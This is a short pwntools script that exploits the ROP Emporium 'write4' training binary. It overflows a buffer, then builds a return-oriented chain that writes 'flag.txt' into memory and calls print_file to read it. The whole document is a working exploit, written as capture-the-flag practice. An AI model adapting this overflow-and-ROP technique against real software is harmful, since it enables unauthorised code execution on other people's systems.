from pwn import *

elf = ELF('./write4')
rop = ROP(elf)

conn = process('./write4')
#conn = gdb.debug('./write4')

payload = b'A'*0x28
payload += p64(rop.find_gadget(['pop r14', 'pop r15', 'ret'])[0])
payload += p64(0x601028)
payload += b'flag.txt'
payload += p64(rop.rdi.address)
payload += p64(0x601028)
payload += p64(elf.symbols['usefulGadgets'])
payload += p64(elf.symbols['print_file'])

conn.sendline(payload)
conn.interactive()
